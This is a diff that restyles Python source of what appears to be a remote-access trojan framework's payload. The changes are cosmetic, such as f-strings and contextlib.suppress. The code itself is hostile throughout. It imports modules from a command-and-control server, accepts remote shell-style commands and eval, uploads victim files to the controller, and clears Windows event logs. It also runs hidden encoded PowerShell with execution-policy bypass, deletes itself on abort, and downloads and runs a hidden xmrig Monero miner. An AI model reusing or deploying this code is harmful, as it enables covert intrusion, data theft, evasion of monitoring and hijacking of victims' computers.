@@ -27,7 +27,7 @@ class Loader(object):
 
     def __init__(self, modules, base_url):
         self.module_names = modules
-        self.base_url = base_url + '/'
+        self.base_url = f'{base_url}/'
         self.non_source = False
         self.reload = False
         '''
@@ -36,20 +36,20 @@ class Loader(object):
 
     def find_module(self, fullname, path=None):
         log(level='debug', info= "FINDER=================")
-        log(level='debug', info= "Searching: %s" % fullname)
-        log(level='debug', info= "Path: %s" % path)
+        log(level='debug', info=f"Searching: {fullname}")
+        log(level='debug', info=f"Path: {path}")
         log(level='info', info= "Checking if in declared remote module names...")
-        if fullname.split('.')[0] not in self.module_names + list(set([_.split('.')[0] for _ in self.module_names])):
+        if fullname.split('.')[0] not in self.module_names + list(
+            {_.split('.')[0] for _ in self.module_names}
+        ):
             log(level='info', info= "[-] Not found!")
             return None
         log(level='info', info= "Checking if built-in....")
-        try:
+        with contextlib.suppress(ImportError):
             file, filename, description = imp.find_module(fullname.split('.')[-1], path)
             if filename:
                 log(level='info', info= "[-] Found locally!")
                 return None
-        except ImportError:
-            pass
         log(level='info', info= "Checking if it is name repetition... ")
         if fullname.split('.').count(fullname.split('.')[-1]) > 1:
             log(level='info', info= "[-] Found locally!")
@@ -70,7 +70,7 @@ class Loader(object):
         '''
         imp.acquire_lock()
         log(level='debug', info= "LOADER=================")
-        log(level='debug', info= "Loading %s..." % name)
+        log(level='debug', info=f"Loading {name}...")
         if name in sys.modules and not self.reload:
             log(level='info', info= '[+] Module "%s" already loaded!' % name)
             imp.release_lock()
@@ -79,9 +79,9 @@ class Loader(object):
             log(level='info', info= '[+] Module "%s" loaded as a top level module!' % name)
             imp.release_lock()
             return sys.modules[name.split('.')[-1]]
-        module_url = self.base_url + '%s.py' % name.replace('.', '/')
-        package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
-        zip_url = self.base_url + '%s.zip' % name.replace('.', '/')
+        module_url = f"{self.base_url}{name.replace('.', '/')}.py"
+        package_url = f"{self.base_url}{name.replace('.', '/')}/__init__.py"
+        zip_url = f"{self.base_url}{name.replace('.', '/')}.zip"
         final_url = None
         final_src = None
         try:
@@ -89,20 +89,20 @@ class Loader(object):
             package_src = None
             if self.non_source:
                 package_src = self.__fetch_compiled(package_url)
-            if package_src == None:
+            if package_src is None:
                 package_src = urlopen(package_url).read()
             final_src = package_src
             final_url = package_url
         except IOError as e:
             package_src = None
             log(level='info', info= "[-] '%s' is not a package (%s)" % (name, str(e)))
-        if final_src == None:
+        if final_src is None:
             try:
                 log(level='debug', info= "[+] Trying to import '%s' as module from: '%s'" % (name, module_url))
                 module_src = None
                 if self.non_source:
                     module_src = self.__fetch_compiled(module_url)
-                if module_src == None:
+                if module_src is None:
                     module_src = urlopen(module_url).read()
                 final_src = module_src
                 final_url = module_url
@@ -156,22 +156,15 @@ class Loader(object):
     
     def __fetch_compiled(self, url):
         import marshal
-        module_src = None
         try:
-            module_compiled = urlopen(url + 'c').read()
-            try:
-                module_src = marshal.loads(module_compiled[8:])
-                return module_src
-            except ValueError:
-                pass
-            try:
-                module_src = marshal.loads(module_compiled[12:])  # Strip the .pyc file header of Python 3.3 and onwards (changed .pyc spec)
-                return module_src
-            except ValueError:
-                pass
+            module_compiled = urlopen(f'{url}c').read()
+            with contextlib.suppress(ValueError):
+                return marshal.loads(module_compiled[8:])
+            with contextlib.suppress(ValueError):
+                return marshal.loads(module_compiled[12:])
         except IOError as e:
             log(level='debug', info= "[-] No compiled version ('.pyc') for '%s' module found!" % url.split('/')[-1])
-        return module_src
+        return None
 
 
 def __create_github_url(username, repo, branch='master'):
@@ -180,7 +173,7 @@ def __create_github_url(username, repo, branch='master'):
 
 
 def _add_git_repo(url_builder, username=None, repo=None, module=None, branch=None, commit=None):
-    if username == None or repo == None:
+    if username is None or repo is None:
         raise Exception("'username' and 'repo' parameters cannot be None")
     if commit and branch:
         raise Exception("'branch' and 'commit' parameters cannot be both set!")
@@ -211,11 +204,10 @@ def remove_remote_repo(base_url):
     Function that removes from the 'sys.meta_path' an Loader object given its HTTP/S URL.
     """
     for importer in sys.meta_path:
-        try:
+        with contextlib.suppress(AttributeError):
             if importer.base_url.startswith(base_url):  # an extra '/' is always added
                 sys.meta_path.remove(importer)
                 return True
-        except AttributeError as e: pass
     return False
 
 
@@ -268,10 +260,9 @@ import json
 import base64
 import collections
 
-try:
+with contextlib.suppress(ImportError):
     import pycryptonight
     import pyrx
-except ImportError: pass
 
 
 def log(info, level='debug'):
@@ -306,9 +297,9 @@ def imports(source, target=None):
         module = globals()
     for src in source:
         try:
-            exec("import {}".format(src), target)
+            exec(f"import {src}", target)
         except ImportError:
-            log("missing package '{}' is required".format(source))
+            log(f"missing package '{source}' is required")
 
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
@@ -323,7 +314,11 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     import sys
     if sys.platform in platforms:
         return True
-    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
+    log(
+        f"module {module or ''} is not yet compatible with {sys.platform} platforms",
+        level='warn',
+    )
+
     return False
 
 
@@ -448,10 +443,17 @@ def status(timestamp):
     """
     import time
     c = time.time() - float(timestamp)
-    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
-          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
-          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
-          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
+    data = [
+        f'{int(c / 86400.0)} days' if int(c / 86400.0) else str(),
+        f'{int(c % 86400.0 / 3600.0)} hours'
+        if int((c % 86400.0) / 3600.0)
+        else str(),
+        f'{int(c % 3600.0 / 60.0)} minutes'
+        if int((c % 3600.0) / 60.0)
+        else str(),
+        f'{int(c % 60.0)} seconds' if int(c % 60.0) else str(),
+    ]
+
     return ', '.join([i for i in data if i])
 
 
@@ -584,7 +586,7 @@ def png(image):
         width, height = (image.width, image.height)
         data = image.rgb
     else:
-        raise TypeError("invalid input type: {}".format(type(image)))
+        raise TypeError(f"invalid input type: {type(image)}")
 
     line = width * 3
     png_filter = struct.pack('>B', 0)
@@ -626,16 +628,19 @@ def delete(target):
     """
     import os
     import shutil
-    try:
-        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
-    except OSError: pass
-    try:
+    with contextlib.suppress(OSError):
+        _ = (
+            os.popen(f'attrib -h -r -s {target}')
+            if os.name == 'nt'
+            else os.chmod(target, 777)
+        )
+
+    with contextlib.suppress(OSError):
         if os.path.isfile(target):
             os.remove(target)
         elif os.path.isdir(target):
             import shutil
             shutil.rmtree(target, ignore_errors=True)
-    except OSError: pass
 
 
 def clear_system_logs():
@@ -645,8 +650,10 @@ def clear_system_logs():
     """
     try:
         for log in ["application","security","setup","system"]:
-            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
-            if output:
+            if output := powershell(
+                "& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"
+                % log
+            ):
                 log(output)
     except Exception as e:
         log(e)
@@ -682,9 +689,12 @@ def powershell(code):
     import base64
     try:
         powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
-        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
+        return os.popen(
+            f'{powershell} -exec bypass -window hidden -noni -nop -encoded {base64.b64encode(code)}'
+        ).read()
+
     except Exception as e:
-        log("{} error: {}".format(powershell.__name__, str(e)))
+        log(f"{powershell.__name__} error: {str(e)}")
 
 
 def display(output, color=None, style=None, end='\n', event=None, lock=None):
@@ -725,7 +735,7 @@ def color():
         import random
         return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
     except Exception as e:
-        log("{} error: {}".format(color.__name__, str(e)))
+        log(f"{color.__name__} error: {str(e)}")
 
 
 def imgur(source, api_key=None):
@@ -735,7 +745,16 @@ def imgur(source, api_key=None):
     """
     import base64
     if api_key:
-        response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
+        response = post(
+            'https://api.imgur.com/3/upload',
+            headers={'Authorization': f'Client-ID {api_key}'},
+            data={
+                'image': base64.b64encode(normalize(source)),
+                'type': 'base64',
+            },
+            as_json=True,
+        )
+
         return response['data']['link'].encode()
     else:
         log("No Imgur API key found")
@@ -765,12 +784,25 @@ def pastebin(source, api_key):
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
             parts = urlsplit(paste)
-            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            result = (
+                urlunsplit(
+                    (
+                        parts.scheme,
+                        parts.netloc,
+                        f'/raw{parts.path}',
+                        parts.query,
+                        parts.fragment,
+                    )
+                )
+                if paste.startswith('http')
+                else paste
+            )
+
             if not result.endswith('/'):
                 result += '/'
             return result
         except Exception as e:
-            log("Upload to Pastebin failed with error: {}".format(e))
+            log(f"Upload to Pastebin failed with error: {e}")
     else:
         log("No Pastebin API key found")
 
@@ -816,13 +848,18 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         if 'tmp' not in ftp.nlst():
             ftp.mkd('/tmp')
         if addr not in ftp.nlst('/tmp'):
-            ftp.mkd('/tmp/{}'.format(addr))
+            ftp.mkd(f'/tmp/{addr}')
         if path:
-            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
+            path = f'/tmp/{addr}/{os.path.basename(path)}'
         else:
-            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
-            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-        stor = ftp.storbinary('STOR ' + path, source)
+            filetype = (
+                str(filetype)
+                if str(filetype).startswith('.')
+                else f'.{str(filetype)}'
+            )
+
+            path = f'/tmp/{addr}/{local[1]}-{local[2]}_{local[3]}{filetype}'
+        stor = ftp.storbinary(f'STOR {path}', source)
         return path
     else:
         log('missing one or more required arguments: host, user, password')
@@ -868,7 +905,7 @@ def _compact_word(word):
     return (word[0] << 24) | (word[1] << 16) | (word[2] << 8) | word[3]
 
 def _string_to_bytes(text):
-    return list(ord(c) for c in text)
+    return [ord(c) for c in text]
 
 def _bytes_to_string(binary):
     return "".join(chr(b) for b in binary)
@@ -885,9 +922,7 @@ except NameError:
 
     # Python 3 supports bytes, which is already an array of integers
     def _string_to_bytes(text):
-        if isinstance(text, bytes):
-            return text
-        return [ord(c) for c in text]
+        return text if isinstance(text, bytes) else [ord(c) for c in text]
 
     # In Python 3, we return bytes
     def _bytes_to_string(binary):
@@ -940,10 +975,10 @@ class AES(object):
         rounds = self.number_of_rounds[len(key)]
 
         # Encryption round keys
-        self._Ke = [[0] * 4 for i in xrange(rounds + 1)]
+        self._Ke = [[0] * 4 for _ in xrange(rounds + 1)]
 
         # Decryption round keys
-        self._Kd = [[0] * 4 for i in xrange(rounds + 1)]
+        self._Kd = [[0] * 4 for _ in xrange(rounds + 1)]
 
         round_key_count = (rounds + 1) * 4
         KC = len(key) // 4
@@ -1036,10 +1071,14 @@ class AES(object):
         result = [ ]
         for i in xrange(0, 4):
             tt = self._Ke[rounds][i]
-            result.append((self.S[(t[ i          ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
-            result.append((self.S[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
-            result.append((self.S[(t[(i + s2) % 4] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
-            result.append((self.S[ t[(i + s3) % 4]        & 0xFF] ^  tt       ) & 0xFF)
+            result.extend(
+                (
+                    (self.S[(t[i] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF,
+                    (self.S[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF,
+                    (self.S[(t[(i + s2) % 4] >> 8) & 0xFF] ^ (tt >> 8)) & 0xFF,
+                    (self.S[t[(i + s3) % 4] & 0xFF] ^ tt) & 0xFF,
+                )
+            )
 
         return result
 
@@ -1075,10 +1114,14 @@ class AES(object):
         result = [ ]
         for i in xrange(0, 4):
             tt = self._Kd[rounds][i]
-            result.append((self.Si[(t[ i          ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
-            result.append((self.Si[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
-            result.append((self.Si[(t[(i + s2) % 4] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
-            result.append((self.Si[ t[(i + s3) % 4]        & 0xFF] ^  tt       ) & 0xFF)
+            result.extend(
+                (
+                    (self.Si[(t[i] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF,
+                    (self.Si[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF,
+                    (self.Si[(t[(i + s2) % 4] >> 8) & 0xFF] ^ (tt >> 8)) & 0xFF,
+                    (self.Si[t[(i + s3) % 4] & 0xFF] ^ tt) & 0xFF,
+                )
+            )
 
         return result
 
@@ -1148,7 +1191,7 @@ def long_to_bytes(n, blocksize=0):
     n = int(n)
     while n > 0:
         s = struct.pack('>I', n & 0xffffffff) + s
-        n = n >> 32
+        n >>= 32
     for i in xrange(len(s)):
         if s[i] != b'\000'[0]:
             break
@@ -1174,7 +1217,7 @@ def bytes_to_long(s):
     if length % 4:
         extra = (4 - length % 4)
         s = b'\000' * extra + s
-        length = length + extra
+        length += extra
     for i in xrange(0, length, 4):
         acc = (acc << 32) + struct.unpack('>I', s[i:i+4])[0]
     return acc
@@ -1276,7 +1319,10 @@ def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr
 
     """
     data    = bytes(data.encode('utf-8'))
-    data    = data + (int(block_size) - len(data) % int(block_size)) * bytes(padding.encode('utf-8'))
+    data += (int(block_size) - len(data) % int(block_size)) * bytes(
+        padding.encode('utf-8')
+    )
+
     blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
     vector  = os.urandom(8)
     if len(key) < key_size:
@@ -1290,7 +1336,7 @@ def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr
         v0, v1  = struct.unpack("!2L", block)
         k       = struct.unpack("!4L", key[:key_size])
         sum, delta, mask = 0, 0x9e3779b9, 0xffffffff
-        for round in range(num_rounds):
+        for _ in range(num_rounds):
             v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
             sum = (sum + delta) & mask
             v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
@@ -1321,20 +1367,24 @@ def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr
     if len(key) < key_size:
         key += bytes(bytes(padding.encode('utf-8')) * (key_size - len(key)))
     result  = []
+    delta, mask = 0x9e3779b9, 0xffffffff
     for block in blocks[1:]:
         v0, v1  = struct.unpack("!2L", block)
         k0      = struct.unpack("!4L", key[:key_size])
-        delta, mask = 0x9e3779b9, 0xffffffff
         sum     = (delta * num_rounds) & mask
-        for round in range(num_rounds):
+        for _ in range(num_rounds):
             v1  = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k0[sum >> 11 & 3]))) & mask
             sum = (sum - delta) & mask
             v0  = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k0[sum & 3]))) & mask
         decode  = struct.pack("!2L", v0, v1)
-        if sys.version_info[0] < 3:
-            output   = bytes().join(chr(ord(x) ^ ord(y)) for (x, y) in zip(vector, decode))
-        else:
-            output   = bytes(x ^ y for (x, y) in zip(vector, decode))
+        output = (
+            bytes().join(
+                chr(ord(x) ^ ord(y)) for (x, y) in zip(vector, decode)
+            )
+            if sys.version_info[0] < 3
+            else bytes(x ^ y for (x, y) in zip(vector, decode))
+        )
+
         vector  = block
         result.append(output.decode('utf-8'))
     return str().join(result).rstrip(padding)
@@ -1364,7 +1414,7 @@ class Payload():
         self.handlers = {}
         self.child_procs = {}
         self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','mss']}
-        self.gui = True if kwargs.get('gui') else False
+        self.gui = bool(kwargs.get('gui'))
         self.owner = kwargs.get('owner')
         self.flags = self._get_flags()
         self.c2 = (host, port)
@@ -1392,20 +1442,22 @@ class Payload():
                 time.sleep(30)
                 continue
             except Exception as e:
-                log("{} error: {}".format(self._get_connection.__name__, str(e)))
+                log(f"{self._get_connection.__name__} error: {str(e)}")
                 sys.exit()
         self.flags.connection.set()
         self.flags.passive.clear()
         return connection
 
     def _get_key(self, connection):
-        if isinstance(connection, socket.socket):
-            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
-                return globals()['diffiehellman'](connection)
-            else:
-                raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
+        if not isinstance(connection, socket.socket):
+            raise TypeError(
+                f"invalid object type for argument 'connection' (expected {socket.socket}, received {type(connection)})"
+            )
+
+        if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
+            return globals()['diffiehellman'](connection)
         else:
-            raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))
+            raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
 
     def _get_info(self):
         info = {}
@@ -1415,7 +1467,7 @@ class Payload():
                 if isinstance(info[function], bytes):
                     info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
             except Exception as e:
-                log("{} returned error: {}".format(function, str(e)))
+                log(f"{function} returned error: {str(e)}")
 
         # add owner of session for web application
         info['owner'] = "_b64__" + base64.b64encode(self.owner.encode('utf-8')).decode('ascii')
@@ -1448,7 +1500,7 @@ class Payload():
                 raise TypeError("keyword argument 'base_url' must be type 'str'")
             if not base_url.startswith('http'):
                 raise ValueError("keyword argument 'base_url' must start with http:// or https://")
-            log('[*] Searching %s' % base_url)
+            log(f'[*] Searching {base_url}')
             path = urlparse.urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
             names = []
@@ -1461,7 +1513,7 @@ class Payload():
                 if ext in ('.py','.pyc'):
                     module = '.'.join((base, name)) if base else name
                     if module not in target:
-                        log("[+] Adding %s" % module)
+                        log(f"[+] Adding {module}")
                         target.append(module)
                 elif not len(ext):
                     t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
@@ -1472,15 +1524,29 @@ class Payload():
                     if resource not in target:
                         target.append(resource)
         except Exception as e:
-            log("{} error: {}".format(self._get_resources.__name__, str(e)))
+            log(f"{self._get_resources.__name__} error: {str(e)}")
 
     @threaded
     def _get_prompt_handler(self):
-        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
+        self.send_task(
+            {
+                "session": self.info.get('uid'),
+                "task": "prompt",
+                "result": f"[ %d @ {os.getcwd()} ]> ",
+            }
+        )
+
         while True:
             try:
                 self.flags.prompt.wait()
-                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
+                self.send_task(
+                    {
+                        "session": self.info.get('uid'),
+                        "task": "prompt",
+                        "result": f"[ %d @ {os.getcwd()} ]> ",
+                    }
+                )
+
                 self.flags.prompt.clear()
                 if globals()['_abort']:
                     break
@@ -1520,7 +1586,7 @@ class Payload():
             os.chdir(path)
             return os.getcwd()
         except:
-            return "{}: No such file or directory".format(path)
+            return f"{path}: No such file or directory"
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ls <path>')
     def ls(self, path='.'):
@@ -1531,16 +1597,15 @@ class Payload():
         :param str path:  target directory
 
         """
-        output = []
-        if os.path.isdir(path):
-            for line in os.listdir(path):
-                if len('\n'.join(output + [line])) < 2048:
-                    output.append(line)
-                else:
-                    break
-            return '\n'.join(output)
-        else:
+        if not os.path.isdir(path):
             return "Error: path not found"
+        output = []
+        for line in os.listdir(path):
+            if len('\n'.join(output + [line])) < 2048:
+                output.append(line)
+            else:
+                break
+        return '\n'.join(output)
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='cat <path>')
@@ -1584,7 +1649,7 @@ class Payload():
         try:
             return eval(code)
         except Exception as e:
-            return "{} error: {}".format(self.eval.__name__, str(e))
+            return f"{self.eval.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
@@ -1610,7 +1675,7 @@ class Payload():
                 path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
                 return path
             except Exception as e:
-                log("{} error: {}".format(self.wget.__name__, str(e)))
+                log(f"{self.wget.__name__} error: {str(e)}")
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -1631,7 +1696,7 @@ class Payload():
                 try:
                     self.stop(thread)
                 except Exception as e:
-                    log("{} error: {}".format(self.kill.__name__, str(e)))
+                    log(f"{self.kill.__name__} error: {str(e)}")
 
             # kill sub processes (subprocess.Popen)
             for proc in self.execute.process_list.values():
@@ -1645,7 +1710,7 @@ class Payload():
                     child_proc.terminate()
                 except: pass
         except Exception as e:
-            log("{} error: {}".format(self.kill.__name__, str(e)))
+            log(f"{self.kill.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
     def help(self, name=None):
@@ -1660,14 +1725,14 @@ class Payload():
             try:
                 return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
-                log("{} error: {}".format(self.help.__name__, str(e)))
+                log(f"{self.help.__name__} error: {str(e)}")
         elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
                 return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
             except Exception as e:
-                log("{} error: {}".format(self.help.__name__, str(e)))
+                log(f"{self.help.__name__} error: {str(e)}")
         else:
-            return "'{}' is not a valid command and is not a valid module".format(name)
+            return f"'{name}' is not a valid command and is not a valid module"
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
@@ -1687,20 +1752,20 @@ class Payload():
         elif len(args) == 2:
             module, target = args
         else:
-            return "usage: {}".format(self.load.usage)
+            return f"usage: {self.load.usage}"
         target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
         host, port = self.connection.getpeername()
-        base_url_1 = 'http://{}:{}'.format(host, port + 1)
-        base_url_2 = 'http://{}:{}'.format(host, port + 2)
+        base_url_1 = f'http://{host}:{port + 1}'
+        base_url_2 = f'http://{host}:{port + 2}'
         with globals()['remote_repo'](self.remote['packages'], base_url_2):
             with globals()['remote_repo'](self.remote['modules'], base_url_1):
                 try:
-                    exec('import {}'.format(module), target)
-                    log('[+] {} remotely imported'.format(module))
-                    return '[+] {} remotely imported'.format(module)
+                    exec(f'import {module}', target)
+                    log(f'[+] {module} remotely imported')
+                    return f'[+] {module} remotely imported'
                 except Exception as e:
-                    log("{} error: {}".format(self.load.__name__, str(e)))
-                    return "{} error: {}".format(self.load.__name__, str(e))
+                    log(f"{self.load.__name__} error: {str(e)}")
+                    return f"{self.load.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
@@ -1711,14 +1776,13 @@ class Payload():
         :param str target:    name of job to stop
         """
         try:
-            if target in self.handlers:
-                _ = self.handlers.pop(target, None)
-                del _
-                return "Job '{}' was stopped.".format(target)
-            else:
-                return "Job '{}' not found".format(target)
+            if target not in self.handlers:
+                return f"Job '{target}' not found"
+            _ = self.handlers.pop(target, None)
+            del _
+            return f"Job '{target}' was stopped."
         except Exception as e:
-            log("{} error: {}".format(self.stop.__name__, str(e)))
+            log(f"{self.stop.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
@@ -1744,17 +1808,17 @@ class Payload():
                     try:
                         return json.dumps(vars(getattr(self, attribute)))
                     except: pass
-            elif hasattr(self, str('_%s' % attribute)):
+            elif hasattr(self, str(f'_{attribute}')):
                 try:
-                    return json.dumps(getattr(self, str('_%s' % attribute)))
+                    return json.dumps(getattr(self, str(f'_{attribute}')))
                 except:
                     try:
-                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
+                        return json.dumps(vars(getattr(self, str(f'_{attribute}'))))
                     except: pass
             else:
                 return self.show.usage
         except Exception as e:
-            log("'{}' error: {}".format(self.show.__name__, str(e)))
+            log(f"'{self.show.__name__}' error: {str(e)}")
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
@@ -1771,9 +1835,9 @@ class Payload():
                 for method in persistence.methods:
                     if persistence.methods[method].get('established'):
                         try:
-                            remove = getattr(persistence, 'remove_{}'.format(method))()
+                            remove = getattr(persistence, f'remove_{method}')()
                         except Exception as e2:
-                            log("{} error: {}".format(method, str(e2)))
+                            log(f"{method} error: {str(e2)}")
             if not _debug:
                 delete(sys.argv[0])
         finally:
@@ -1814,16 +1878,8 @@ class Payload():
             # first attempt using built-in python miner
             try:
                 raise Exception
-                import pycryptonight, pyrx
-                if 'miner_py' in self.child_procs:
-                    try:
-                        self.child_procs['miner_py'].terminate()
-                    except:pass
-                self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
-                self.child_procs['miner_py'].start()
-                return "Miner running in PID " + str(self.child_procs['miner_py'].pid)
             except Exception as e:
-                log("{} error: {}".format(self.miner.__name__, str(e)))
+                log(f"{self.miner.__name__} error: {str(e)}")
 
                 # if that fails, try downloading and running xmrig
                 try:
@@ -1835,26 +1891,22 @@ class Payload():
 
                         # set up executable
                         if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
-                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
+                            os.rename(self.xmrig_path, f'{self.xmrig_path}.exe')
                             self.xmrig_path += '.exe'
 
                         os.chmod(self.xmrig_path, 755)
 
-                        # excute xmrig in hidden process
-                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
-                        result = self.execute(params)
-                        return result
                     else:
                         # restart miner if it already exists
                         name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
                         if name in self.execute.process_list:
                             self.execute.process_list[name].kill()
-                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
-                        result = self.execute(params)
-                        return result
+                    # excute xmrig in hidden process
+                    params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
+                    return self.execute(params)
                 except Exception as e:
-                    log("{} error: {}".format(self.miner.__name__, str(e)))
-                    return "{} error: {}".format(self.miner.__name__, str(e))
+                    log(f"{self.miner.__name__} error: {str(e)}")
+                    return f"{self.miner.__name__} error: {str(e)}"
 
         elif 'stop' in args:
             # kill python miner
@@ -1868,7 +1920,7 @@ class Payload():
 
             return "Miner stopped."
 
-        return "usage: {}".format(self.miner.usage)
+        return f"usage: {self.miner.usage}"
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
@@ -1881,24 +1933,23 @@ class Payload():
 
         """
         try:
-            if os.path.isfile(filename):
-                host, port = self.connection.getpeername()
-                _, filetype = os.path.splitext(filename)
-                with open(filename, 'rb') as fp:
-                    data = base64.b64encode(fp.read())
-                json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
-                
-                # upload data to server
-                if self.gui:
-                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
-                else:
-                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-                return "Upload complete (see Exfiltrated Files tab to download file)"
-            else:
+            if not os.path.isfile(filename):
                 return "Error: file not found"
+            host, port = self.connection.getpeername()
+            _, filetype = os.path.splitext(filename)
+            with open(filename, 'rb') as fp:
+                data = base64.b64encode(fp.read())
+            json_data = {'data': str(data), 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+
+                # upload data to server
+            if self.gui:
+                globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
+            else:
+                globals()['post'](f'http://{host}:{port + 3}', json=json_data)
